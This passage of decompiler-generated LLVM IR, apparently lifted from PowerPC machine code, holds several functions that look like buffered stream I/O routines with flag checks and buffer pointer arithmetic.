  %v3_10009778 = zext i8 %v2_10009778 to i32
  store i32 %v3_10009778, i32* %r0.global-to-local, align 4
  %v1_1000977c = add i32 %v0_10009778, 1
  store i32 %v1_1000977c, i32* @r29, align 4
  %v3_10009780 = inttoptr i32 %v2_10009780 to i8*
  store i8 %v2_10009778, i8* %v3_10009780, align 1
  %v0_10009784 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009784 = urem i32 %v0_10009784, 256
  store i32 %v1_10009784, i32* %r0.global-to-local, align 4
  %v3_10009788 = icmp eq i32 %v1_10009784, 10
  br i1 %v3_10009788, label %dec_label_pc_10009790, label %dec_label_pc_1000979c

dec_label_pc_10009790:                            ; preds = %dec_label_pc_10009778
  %v0_10009790 = load i32, i32* @r30, align 4
  %v1_10009790 = inttoptr i32 %v0_10009790 to i16*
  %v2_10009790 = load i16, i16* %v1_10009790, align 2
  %v3_10009790 = zext i16 %v2_10009790 to i32
  store i32 %v3_10009790, i32* %r0.global-to-local, align 4
  %v1_10009794 = and i32 %v3_10009790, 256
  %v3_10009794 = icmp eq i32 %v1_10009794, 0
  br i1 %v3_10009794, label %dec_label_pc_1000979c, label %dec_label_pc_10009790.dec_label_pc_100097a4_crit_edge

dec_label_pc_10009790.dec_label_pc_100097a4_crit_edge: ; preds = %dec_label_pc_10009790
  %v0_100097a8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100097a4

dec_label_pc_1000979c:                            ; preds = %dec_label_pc_10009790, %dec_label_pc_10009778
  %v0_1000979c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000979c = add i32 %v0_1000979c, 1
  store i32 %v1_1000979c, i32* %r11.global-to-local, align 4
  %v0_100097a0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100097a0 = add i32 %v0_100097a0, -1
  store i32 %v1_100097a0, i32* %ctr.global-to-local, align 4
  %v2_100097a0 = icmp eq i32 %v1_100097a0, 0
  br i1 %v2_100097a0, label %dec_label_pc_1000979c.dec_label_pc_100097a4_crit_edge, label %dec_label_pc_10009778

dec_label_pc_1000979c.dec_label_pc_100097a4_crit_edge: ; preds = %dec_label_pc_1000979c
  %v0_100097a4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_100097a4

dec_label_pc_100097a4:                            ; preds = %dec_label_pc_10009790.dec_label_pc_100097a4_crit_edge, %dec_label_pc_1000979c.dec_label_pc_100097a4_crit_edge
  %v0_100097a8 = phi i32 [ %v1_1000979c, %dec_label_pc_1000979c.dec_label_pc_100097a4_crit_edge ], [ %v0_100097a8.pre, %dec_label_pc_10009790.dec_label_pc_100097a4_crit_edge ]
  %v0_100097a4 = phi i32 [ %v0_100097a4.pre, %dec_label_pc_1000979c.dec_label_pc_100097a4_crit_edge ], [ %v0_10009790, %dec_label_pc_10009790.dec_label_pc_100097a4_crit_edge ]
  %v1_100097a4 = add i32 %v0_100097a4, 8
  %v2_100097a4 = inttoptr i32 %v1_100097a4 to i32*
  %v3_100097a4 = load i32, i32* %v2_100097a4, align 4
  store i32 %v3_100097a4, i32* %r0.global-to-local, align 4
  %v2_100097a8 = add i32 %v0_100097a4, 16
  %v3_100097a8 = inttoptr i32 %v2_100097a8 to i32*
  store i32 %v0_100097a8, i32* %v3_100097a8, align 4
  %v0_100097ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100097ac = load i32, i32* %r11.global-to-local, align 4
  %v2_100097ac = sub i32 %v1_100097ac, %v0_100097ac
  store i32 %v2_100097ac, i32* %r0.global-to-local, align 4
  %v1_100097b0 = load i32, i32* @r31, align 4
  %v2_100097b0 = sub i32 %v1_100097b0, %v2_100097ac
  store i32 %v2_100097b0, i32* @r31, align 4
  br label %dec_label_pc_100097b4

dec_label_pc_100097b4:                            ; preds = %dec_label_pc_1000974c.dec_label_pc_100097b4_crit_edge, %dec_label_pc_100097a4
  %v0_100097b4 = phi i32 [ %v0_100097b4.pre, %dec_label_pc_1000974c.dec_label_pc_100097b4_crit_edge ], [ %v2_100097b0, %dec_label_pc_100097a4 ]
  %v1_100097b4 = load i32, i32* @r28, align 4
  %v2_100097b4 = sub i32 %v1_100097b4, %v0_100097b4
  store i32 %v2_100097b4, i32* @r28, align 4
  br label %dec_label_pc_100097b8

dec_label_pc_10009710.dec_label_pc_100097b8.loopexit_crit_edge: ; preds = %dec_label_pc_10009740
  %v0_100097bc.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100097b8

dec_label_pc_100097b8:                            ; preds = %dec_label_pc_100096f0, %dec_label_pc_10009710.dec_label_pc_100097b8.loopexit_crit_edge, %dec_label_pc_100097b4
  %v0_100097bc = phi i32 [ %v2_100097b4, %dec_label_pc_100097b4 ], [ %v0_100097bc.pre.pre, %dec_label_pc_10009710.dec_label_pc_100097b8.loopexit_crit_edge ], [ 0, %dec_label_pc_100096f0 ]
  store i32 %v0_100096f0, i32* %r0.global-to-local, align 4
  ret i32 %v0_100097bc

; uselistorder directives
  uselistorder i32 %v0_100097a4, { 1, 0 }
  uselistorder i32 %v1_100097a0, { 1, 0 }
  uselistorder i32 %v1_1000979c, { 0, 2, 1 }
  uselistorder i32 %v1_10009784, { 1, 0 }
  uselistorder i32 %v2_10009744, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10009740, { 1, 0 }
  uselistorder i32 %v3_10009734, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 2, 1, 5 }
  uselistorder label %dec_label_pc_100097b8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100097b4, { 1, 0 }
  uselistorder label %dec_label_pc_100097a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009774, { 1, 0 }
  uselistorder label %dec_label_pc_1000972c, { 1, 0 }
  uselistorder label %dec_label_pc_10009720, { 1, 0 }
}

define i32 @function_100097d0(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_100097d0:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_100097d0 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_100097ec = load i16, i16* %arg3, align 2
  %v1_100097f0 = and i16 %v3_100097ec, 512
  %v3_100097f0 = icmp eq i16 %v1_100097f0, 0
  br i1 %v3_100097f0, label %dec_label_pc_100097f8, label %dec_label_pc_10009904

dec_label_pc_100097f8:                            ; preds = %dec_label_pc_100097d0
  %v2_100097f8 = add i32 %tmp, 4
  %v3_100097f8 = inttoptr i32 %v2_100097f8 to i32*
  %v4_100097f8 = load i32, i32* %v3_100097f8, align 4
  %v2_100097fc = add i32 %tmp, 16
  %v3_100097fc = inttoptr i32 %v2_100097fc to i32*
  %v4_100097fc = load i32, i32* %v3_100097fc, align 4
  store i32 %v4_100097fc, i32* @r3, align 4
  %v3_10009800 = icmp eq i32 %v4_100097f8, -2
  %v2_10009804 = add i32 %tmp, 12
  %v3_10009804 = inttoptr i32 %v2_10009804 to i32*
  %v4_10009804 = load i32, i32* %v3_10009804, align 4
  %v2_1000980c = sub i32 %v4_10009804, %v4_100097fc
  br i1 %v3_10009800, label %dec_label_pc_1000980c, label %dec_label_pc_1000983c

dec_label_pc_1000980c:                            ; preds = %dec_label_pc_100097f8
  %v3_10009814 = icmp ult i32 %v2_1000980c, %arg2
  br i1 %v3_10009814, label %dec_label_pc_1000981c, label %dec_label_pc_10009820

dec_label_pc_1000981c:                            ; preds = %dec_label_pc_1000980c
  br label %dec_label_pc_10009820

dec_label_pc_10009820:                            ; preds = %dec_label_pc_1000980c, %dec_label_pc_1000981c
  %storemerge = phi i32 [ %v2_1000980c, %dec_label_pc_1000981c ], [ %arg2, %dec_label_pc_1000980c ]
  %v0_10009824 = phi i32 [ %v2_1000980c, %dec_label_pc_1000981c ], [ %arg2, %dec_label_pc_1000980c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10009824, i32* @r5, align 4
  store i32 268474412, i32* @lr, align 4
  %v0_10009828 = call i32 @function_10006d8c()
  %v0_1000982c = load i32, i32* @r30, align 4
  %v1_1000982c = add i32 %v0_1000982c, 16
  %v2_1000982c = inttoptr i32 %v1_1000982c to i32*
  %v3_1000982c = load i32, i32* %v2_1000982c, align 4
  %v1_10009830 = load i32, i32* @r31, align 4
  %v2_10009830 = add i32 %v1_10009830, %v3_1000982c
  store i32 %v2_10009830, i32* %v2_1000982c, align 4
  br label %dec_label_pc_10009924

dec_label_pc_1000983c:                            ; preds = %dec_label_pc_100097f8
  %v3_10009840 = icmp ult i32 %v2_1000980c, %arg2
  br i1 %v3_10009840, label %dec_label_pc_100098e0, label %dec_label_pc_10009848

dec_label_pc_10009848:                            ; preds = %dec_label_pc_1000983c
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268474452, i32* @lr, align 4
  %v0_10009850 = call i32 @function_10006d8c()
  %v0_10009854 = load i32, i32* @r30, align 4
  %v1_10009854 = inttoptr i32 %v0_10009854 to i16*
  %v2_10009854 = load i16, i16* %v1_10009854, align 2
  %v1_10009858 = add i32 %v0_10009854, 16
  %v2_10009858 = inttoptr i32 %v1_10009858 to i32*
  %v3_10009858 = load i32, i32* %v2_10009858, align 4
  %v1_1000985c = and i16 %v2_10009854, 256
  %v3_1000985c = icmp eq i16 %v1_1000985c, 0
  %v1_10009860 = load i32, i32* @r29, align 4
  %v2_10009860 = add i32 %v1_10009860, %v3_10009858
  store i32 %v2_10009860, i32* %v2_10009858, align 4
  br i1 %v3_1000985c, label %dec_label_pc_10009924, label %dec_label_pc_1000986c

dec_label_pc_1000986c:                            ; preds = %dec_label_pc_10009848
  %v0_1000986c = load i32, i32* @r28, align 4
  %v0_10009874 = load i32, i32* @r29, align 4
  store i32 268474492, i32* @lr, align 4
  %v4_10009878 = call i32 @function_1000a5c4(i32 %v0_1000986c, i32 10, i32 %v0_10009874, i32 %v2_10009860)
  %v3_1000987c = icmp eq i32 %v4_10009878, 0
  br i1 %v3_1000987c, label %dec_label_pc_10009924, label %dec_label_pc_10009884

dec_label_pc_10009884:                            ; preds = %dec_label_pc_1000986c
  %v0_10009884 = load i32, i32* @r30, align 4
  store i32 %v0_10009884, i32* @r3, align 4
  store i32 268474508, i32* @lr, align 4
  %v0_10009888 = call i32 @function_10005544()
  %v3_1000988c = icmp eq i32 %v0_10009888, 0
  br i1 %v3_1000988c, label %dec_label_pc_10009924, label %dec_label_pc_10009894

dec_label_pc_10009894:                            ; preds = %dec_label_pc_10009884
  %v0_10009894 = load i32, i32* @r29, align 4
  %v3_10009894 = icmp ugt i32 %v0_10009894, %v0_10009888
  %v0_10009888.v0_10009898 = select i1 %v3_10009894, i32 %v0_10009888, i32 %v0_10009894
  store i32 %v0_10009888.v0_10009898, i32* @r31, align 4
  %v2_100098a4 = sub i32 %v0_10009894, %v0_10009888.v0_10009898
  %v0_100098ac = load i32, i32* @r28, align 4
  %v2_100098ac = add i32 %v0_100098ac, %v2_100098a4
  store i32 %v2_100098ac, i32* @r28, align 4
  store i32 %v2_100098ac, i32* @r3, align 4
  store i32 268474556, i32* @lr, align 4
  %v3_100098b8 = call i32 @function_1000a488(i32 %v2_100098ac, i32 10, i32 %v0_10009888.v0_10009898)
  %v3_100098bc = icmp eq i32 %v3_100098b8, 0
  br i1 %v3_100098bc, label %dec_label_pc_10009924, label %dec_label_pc_100098c4

dec_label_pc_100098c4:                            ; preds = %dec_label_pc_10009894
  %v0_100098c4 = load i32, i32* @r30, align 4
  %v1_100098c4 = add i32 %v0_100098c4, 16
  %v2_100098c4 = inttoptr i32 %v1_100098c4 to i32*
  %v3_100098c4 = load i32, i32* %v2_100098c4, align 4
  %v0_100098c8 = load i32, i32* @r28, align 4
  %v1_100098c8 = load i32, i32* @r31, align 4
  %v2_100098c8 = sub i32 %v0_100098c8, %v3_100098b8
  %v2_100098cc = add i32 %v2_100098c8, %v1_100098c8
  %v2_100098d0 = sub i32 %v3_100098c4, %v2_100098cc
  %v1_100098d4 = load i32, i32* @r29, align 4
  %v2_100098d4 = sub i32 %v1_100098d4, %v2_100098cc
  store i32 %v2_100098d4, i32* @r29, align 4
  store i32 %v2_100098d0, i32* %v2_100098c4, align 4
  br label %dec_label_pc_10009924

dec_label_pc_100098e0:                            ; preds = %dec_label_pc_1000983c
  %v2_100098e0 = add i32 %tmp, 8
  %v3_100098e0 = inttoptr i32 %v2_100098e0 to i32*
  %v4_100098e0 = load i32, i32* %v3_100098e0, align 4
  %v4_100098e4 = icmp eq i32 %v4_100097fc, %v4_100098e0
  br i1 %v4_100098e4, label %dec_label_pc_10009904, label %dec_label_pc_100098ec

dec_label_pc_100098ec:                            ; preds = %dec_label_pc_100098e0
  store i32 %tmp, i32* @r3, align 4
  store i32 268474612, i32* @lr, align 4
  %v0_100098f0 = call i32 @function_10005544()
  %v3_100098f4 = icmp eq i32 %v0_100098f0, 0
  br i1 %v3_100098f4, label %dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge, label %dec_label_pc_100098fc

dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge: ; preds = %dec_label_pc_100098ec
  %v0_10009908.pre = load i32, i32* @r30, align 4
  %v0_1000990c.pre = load i32, i32* @r28, align 4
  %v0_10009910.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009904

dec_label_pc_100098fc:                            ; preds = %dec_label_pc_100098ec
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10009924

dec_label_pc_10009904:                            ; preds = %dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge, %dec_label_pc_100097d0, %dec_label_pc_100098e0
  %v0_10009910 = phi i32 [ %v0_10009910.pre, %dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge ], [ %arg2, %dec_label_pc_100097d0 ], [ %arg2, %dec_label_pc_100098e0 ]
  %v0_1000990c = phi i32 [ %v0_1000990c.pre, %dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge ], [ %arg1, %dec_label_pc_100097d0 ], [ %arg1, %dec_label_pc_100098e0 ]
  %v0_10009908 = phi i32 [ %v0_10009908.pre, %dec_label_pc_100098ec.dec_label_pc_10009904_crit_edge ], [ %tmp, %dec_label_pc_100097d0 ], [ %tmp, %dec_label_pc_100098e0 ]
  %v1_10009908 = inttoptr i32 %v0_10009908 to i16*
  store i32 %v0_10009910, i32* @r5, align 4
  store i32 %v0_100097d0, i32* @lr, align 4
  %v5_10009920 = call i32 @function_100096f0(i16* %v1_10009908, i32 %v0_1000990c)
  br label %dec_label_pc_10009924

dec_label_pc_10009924:                            ; preds = %dec_label_pc_10009894, %dec_label_pc_10009884, %dec_label_pc_1000986c, %dec_label_pc_10009848, %dec_label_pc_100098fc, %dec_label_pc_100098c4, %dec_label_pc_10009820, %dec_label_pc_10009904
  %v0_10009928 = load i32, i32* @r29, align 4
  ret i32 %v0_10009928

; uselistorder directives
  uselistorder i32 %v2_100098cc, { 1, 0 }
  uselistorder i32 %v0_10009888.v0_10009898, { 0, 2, 1 }
  uselistorder i32 %v0_10009894, { 1, 0, 2 }
  uselistorder i32 %v2_1000980c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10009924, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10009904, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009820, { 1, 0 }
}

define i32 @function_1000993c(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000993c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000993c = load i32, i32* @lr, align 4
  store i32 %v0_1000993c, i32* %r0.global-to-local, align 4
  %v0_10009944 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009950 = load i16, i16* %arg1, align 2
  %v4_10009950 = zext i16 %v3_10009950 to i32
  store i32 %v4_10009950, i32* %r0.global-to-local, align 4
  %v1_10009954 = load i32, i32* @r4, align 4
  %v2_10009954 = and i32 %v1_10009954, %v4_10009950
  store i32 %v2_10009954, i32* %r9.global-to-local, align 4
  %v5_10009954 = icmp eq i32 %v2_10009954, 0
  br i1 %v5_10009954, label %dec_label_pc_1000995c, label %dec_label_pc_1000996c

dec_label_pc_1000995c:                            ; preds = %dec_label_pc_1000993c
  %v1_1000995c = and i32 %v4_10009950, 2176
  store i32 %v1_1000995c, i32* %r9.global-to-local, align 4
  %v3_1000995c = icmp eq i32 %v1_1000995c, 0
  br i1 %v3_1000995c, label %dec_label_pc_10009964, label %dec_label_pc_10009978

dec_label_pc_10009964:                            ; preds = %dec_label_pc_1000995c
  %v2_10009964 = or i32 %v1_10009954, %v4_10009950
  store i32 %v2_10009964, i32* %r0.global-to-local, align 4
  %v1_10009968 = trunc i32 %v2_10009964 to i16
  store i16 %v1_10009968, i16* %arg1, align 2
  %v0_1000996c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000996c

dec_label_pc_1000996c:                            ; preds = %dec_label_pc_1000993c, %dec_label_pc_10009964
  %v0_100099a8 = phi i32 [ %tmp, %dec_label_pc_1000993c ], [ %v0_1000996c.pre, %dec_label_pc_10009964 ]
  %v1_1000996c = inttoptr i32 %v0_100099a8 to i16*
  %v2_1000996c = load i16, i16* %v1_1000996c, align 2
  %v3_1000996c = zext i16 %v2_1000996c to i32
  %v1_10009970 = and i32 %v3_1000996c, 32
  store i32 %v1_10009970, i32* %r0.global-to-local, align 4
  %v3_10009970 = icmp eq i32 %v1_10009970, 0
  br i1 %v3_10009970, label %dec_label_pc_10009998, label %dec_label_pc_10009978

dec_label_pc_10009978:                            ; preds = %dec_label_pc_1000995c, %dec_label_pc_1000996c
  %v0_10009978 = call i32 @function_10004b48()
  store i32 %v0_10009978, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10009980 = inttoptr i32 %v0_10009978 to i32*
  store i32 9, i32* %v2_10009980, align 4
  br label %dec_label_pc_10009984

dec_label_pc_10009984:                            ; preds = %dec_label_pc_100099c0, %dec_label_pc_10009978
  %v0_10009984 = load i32, i32* @r31, align 4
  %v1_10009984 = inttoptr i32 %v0_10009984 to i16*
  %v2_10009984 = load i16, i16* %v1_10009984, align 2
  %v3_10009984 = zext i16 %v2_10009984 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_1000998c = or i32 %v3_10009984, 8
  store i32 %v1_1000998c, i32* %r0.global-to-local, align 4
  %v1_10009990 = trunc i32 %v1_1000998c to i16
  store i16 %v1_10009990, i16* %v1_10009984, align 2
  br label %dec_label_pc_10009a20

dec_label_pc_10009998:                            ; preds = %dec_label_pc_1000996c
  %tmp8 = urem i16 %v2_1000996c, 4
  %v1_10009998 = zext i16 %tmp8 to i32
  store i32 %v1_10009998, i32* %r0.global-to-local, align 4
  %v3_10009998 = icmp eq i16 %tmp8, 0
  br i1 %v3_10009998, label %dec_label_pc_100099fc, label %dec_label_pc_100099a0

dec_label_pc_100099a0:                            ; preds = %dec_label_pc_10009998
  %v1_100099a0 = and i32 %v3_1000996c, 4
  store i32 %v1_100099a0, i32* %r9.global-to-local, align 4
  %v3_100099a0 = icmp eq i32 %v1_100099a0, 0
  br i1 %v3_100099a0, label %dec_label_pc_100099a8, label %dec_label_pc_100099e0

dec_label_pc_100099a8:                            ; preds = %dec_label_pc_100099a0
  %v1_100099a8 = add i32 %v0_100099a8, 20
  %v2_100099a8 = inttoptr i32 %v1_100099a8 to i32*
  %v3_100099a8 = load i32, i32* %v2_100099a8, align 4
  store i32 %v3_100099a8, i32* %r0.global-to-local, align 4
  %v1_100099ac = add i32 %v0_100099a8, 16
  %v2_100099ac = inttoptr i32 %v1_100099ac to i32*
  %v3_100099ac = load i32, i32* %v2_100099ac, align 4
  store i32 %v3_100099ac, i32* %r9.global-to-local, align 4
  %v4_100099b0 = icmp eq i32 %v3_100099a8, %v3_100099ac
  br i1 %v4_100099b0, label %dec_label_pc_100099b8, label %dec_label_pc_100099c0

dec_label_pc_100099b8:                            ; preds = %dec_label_pc_100099a8
  %v1_100099b8 = and i32 %v3_1000996c, 2
  store i32 %v1_100099b8, i32* %r0.global-to-local, align 4
  %v3_100099b8 = icmp eq i32 %v1_100099b8, 0
  br i1 %v3_100099b8, label %dec_label_pc_100099e0, label %dec_label_pc_100099c0

dec_label_pc_100099c0:                            ; preds = %dec_label_pc_100099a8, %dec_label_pc_100099b8
  %v1_100099c0 = and i32 %v3_1000996c, 1024
  store i32 %v1_100099c0, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_100099c8 = call i32 @__asm_mfcr()
  store i32 %v0_100099c8, i32* %r3.global-to-local, align 4
  %v1_100099cc = call i32 @__asm_rlwinm(i32 %v0_100099c8, i32 3, i32 31, i32 31)
  %v1_100099d0 = sub i32 2, %v1_100099cc
  store i32 %v1_100099d0, i32* @r5, align 4
  store i32 268474840, i32* @lr, align 4
  %v1_100099d4 = inttoptr i32 %v1_100099d0 to i16*
  %v2_100099d4 = call i32 @function_1000b5f4(i16* %v1_100099d4)
  store i32 %v2_100099d4, i32* %r3.global-to-local, align 4
  %v3_100099d8 = icmp eq i32 %v2_100099d4, 0
  br i1 %v3_100099d8, label %dec_label_pc_100099c0.dec_label_pc_100099e0_crit_edge, label %dec_label_pc_10009984

dec_label_pc_100099c0.dec_label_pc_100099e0_crit_edge: ; preds = %dec_label_pc_100099c0
  %v0_100099e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099e0

dec_label_pc_100099e0:                            ; preds = %dec_label_pc_100099c0.dec_label_pc_100099e0_crit_edge, %dec_label_pc_100099a0, %dec_label_pc_100099b8
  %v0_100099e0 = phi i32 [ %v0_100099e0.pre, %dec_label_pc_100099c0.dec_label_pc_100099e0_crit_edge ], [ %v0_100099a8, %dec_label_pc_100099a0 ], [ %v0_100099a8, %dec_label_pc_100099b8 ]
  %v1_100099e0 = inttoptr i32 %v0_100099e0 to i16*
  %v2_100099e0 = load i16, i16* %v1_100099e0, align 2
  %v3_100099e0 = zext i16 %v2_100099e0 to i32
  store i32 %v3_100099e0, i32* %r0.global-to-local, align 4
  %v1_100099e4 = add i32 %v0_100099e0, 8
  %v2_100099e4 = inttoptr i32 %v1_100099e4 to i32*
  %v3_100099e4 = load i32, i32* %v2_100099e4, align 4
  store i32 %v3_100099e4, i32* %r9.global-to-local, align 4
  %v1_100099e8 = call i32 @__asm_rlwinm(i32 %v3_100099e0, i32 0, i32 0, i32 29)
  %v2_100099e8 = trunc i32 %v1_100099e8 to i16
  store i32 %v1_100099e8, i32* %r0.global-to-local, align 4
  %v3_100099ec = load i32, i32* @r31, align 4
  %v4_100099ec = inttoptr i32 %v3_100099ec to i16*
  store i16 %v2_100099e8, i16* %v4_100099ec, align 2
  %v0_100099f0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f0 = load i32, i32* @r31, align 4
  %v2_100099f0 = add i32 %v1_100099f0, 20
  %v3_100099f0 = inttoptr i32 %v2_100099f0 to i32*
  store i32 %v0_100099f0, i32* %v3_100099f0, align 4
  %v0_100099f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f4 = load i32, i32* @r31, align 4
  %v2_100099f4 = add i32 %v1_100099f4, 24
  %v3_100099f4 = inttoptr i32 %v2_100099f4 to i32*
  store i32 %v0_100099f4, i32* %v3_100099f4, align 4
  %v0_100099f8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100099f8 = load i32, i32* @r31, align 4
  %v2_100099f8 = add i32 %v1_100099f8, 16
  %v3_100099f8 = inttoptr i32 %v2_100099f8 to i32*
  store i32 %v0_100099f8, i32* %v3_100099f8, align 4
  %v0_100099fc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100099fc

dec_label_pc_100099fc:                            ; preds = %dec_label_pc_10009998, %dec_label_pc_100099e0
  %v2_10009a08 = phi i32 [ %v0_100099a8, %dec_label_pc_10009998 ], [ %v0_100099fc.pre, %dec_label_pc_100099e0 ]
  %v1_100099fc = inttoptr i32 %v2_10009a08 to i16*
  %v2_100099fc = load i16, i16* %v1_100099fc, align 2
  %v3_100099fc = zext i16 %v2_100099fc to i32
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10009a04 = or i32 %v3_100099fc, 64
  store i32 %v1_10009a04, i32* %r0.global-to-local, align 4
  %v1_10009a08 = trunc i32 %v1_10009a04 to i16
  store i16 %v1_10009a08, i16* %v1_100099fc, align 2
  %v0_10009a0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10009a0c = urem i32 %v0_10009a0c, 65536
  store i32 %v1_10009a0c, i32* %r0.global-to-local, align 4
  %v1_10009a10 = and i32 %v0_10009a0c, 2816
  store i32 %v1_10009a10, i32* %r9.global-to-local, align 4
  %v3_10009a10 = icmp eq i32 %v1_10009a10, 0
  br i1 %v3_10009a10, label %dec_label_pc_10009a18, label %dec_label_pc_10009a20

dec_label_pc_10009a18:                            ; preds = %dec_label_pc_100099fc
  %v0_10009a18 = load i32, i32* @r31, align 4
  %v1_10009a18 = add i32 %v0_10009a18, 12
  %v2_10009a18 = inttoptr i32 %v1_10009a18 to i32*
  %v3_10009a18 = load i32, i32* %v2_10009a18, align 4
  store i32 %v3_10009a18, i32* %r0.global-to-local, align 4
  %v2_10009a1c = add i32 %v0_10009a18, 28
  %v3_10009a1c = inttoptr i32 %v2_10009a1c to i32*
  store i32 %v3_10009a18, i32* %v3_10009a1c, align 4
  br label %dec_label_pc_10009a20

dec_label_pc_10009a20:                            ; preds = %dec_label_pc_100099fc, %dec_label_pc_10009984, %dec_label_pc_10009a18
  store i32 %v0_1000993c, i32* %r0.global-to-local, align 4
  store i32 %v0_10009944, i32* @r31, align 4
  %v0_10009a30 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10009a30

; uselistorder directives
  uselistorder i32 %v0_10009a0c, { 1, 0 }
  uselistorder i32 %v1_100099e8, { 1, 0 }
  uselistorder i32 %v0_100099e0, { 1, 0 }
  uselistorder i32 %v0_100099a8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_10009950, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 4, 2, 3, 0, 5, 6, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15 }
  uselistorder i32 1024, { 5, 6, 7, 4, 0, 2, 3, 1 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10009a20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100099fc, { 1, 0 }
  uselistorder label %dec_label_pc_100099e0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100099c0, { 1, 0 }
  uselistorder label %dec_label_pc_10009978, { 1, 0 }
  uselistorder label %dec_label_pc_1000996c, { 1, 0 }
}

define i32 @function_10009a34(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10009a34:
  %v0_10009a34 = load i32, i32* @r5, align 4
  %v1_10009a34 = icmp slt i32 %v0_10009a34, 0
  %v1_10009a38 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 20, i32 20)
  %v3_10009a74 = icmp eq i32 %v1_10009a38, 0
  br i1 %v1_10009a34, label %dec_label_pc_10009a74, label %dec_label_pc_10009a40

dec_label_pc_10009a40:                            ; preds = %dec_label_pc_10009a34
  br i1 %v3_10009a74, label %dec_label_pc_10009a48, label %dec_label_pc_10009a7c

dec_label_pc_10009a48:                            ; preds = %dec_label_pc_10009a40
  %v3_10009a48 = icmp eq i32 %arg1, 256
  br i1 %v3_10009a48, label %dec_label_pc_10009a54, label %dec_label_pc_10009a5c

dec_label_pc_10009a54:                            ; preds = %dec_label_pc_10009a48
  br label %dec_label_pc_10009a68

dec_label_pc_10009a5c:                            ; preds = %dec_label_pc_10009a48
  %v3_10009a5c = icmp eq i32 %arg1, 512
  br i1 %v3_10009a5c, label %dec_label_pc_10009a64, label %dec_label_pc_10009a68

dec_label_pc_10009a64:                            ; preds = %dec_label_pc_10009a5c
  br label %dec_label_pc_10009a68

dec_label_pc_10009a68:                            ; preds = %dec_label_pc_10009a5c, %dec_label_pc_10009a54, %dec_label_pc_10009a64
  ret i32 0

dec_label_pc_10009a74:                            ; preds = %dec_label_pc_10009a34
  br i1 %v3_10009a74, label %dec_label_pc_10009a88, label %dec_label_pc_10009a7c

dec_label_pc_10009a7c:                            ; preds = %dec_label_pc_10009a40, %dec_label_pc_10009a74
  %v2_10009a7c = load i32, i32* %arg2, align 4
  ret i32 %v2_10009a7c

dec_label_pc_10009a88:                            ; preds = %dec_label_pc_10009a74
  %v3_10009a88 = icmp eq i32 %arg1, 256
  %v2_10009a8c = load i32, i32* %arg2, align 4
  br i1 %v3_10009a88, label %dec_label_pc_10009a94, label %dec_label_pc_10009a9c

dec_label_pc_10009a94:                            ; preds = %dec_label_pc_10009a88
  %v1_10009a94 = urem i32 %v2_10009a8c, 256
  br label %dec_label_pc_10009aa8

dec_label_pc_10009a9c:                            ; preds = %dec_label_pc_10009a88
  %v3_10009a9c = icmp eq i32 %arg1, 512
  br i1 %v3_10009a9c, label %dec_label_pc_10009aa4, label %dec_label_pc_10009aa8

dec_label_pc_10009aa4:                            ; preds = %dec_label_pc_10009a9c
  %v1_10009aa4 = mul i32 %v2_10009a8c, 65536
